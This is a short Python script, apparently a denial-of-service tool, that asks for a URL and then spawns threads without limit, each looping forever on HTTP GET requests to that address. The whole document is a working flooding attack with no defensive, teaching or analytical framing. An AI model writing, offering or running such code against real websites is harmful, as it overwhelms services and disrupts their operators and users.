import threading
import requests
url = input("Enter url:")
def dos():
 while True:
  requests.get(url)
while True:
 threading.Thread(target=dos).start()
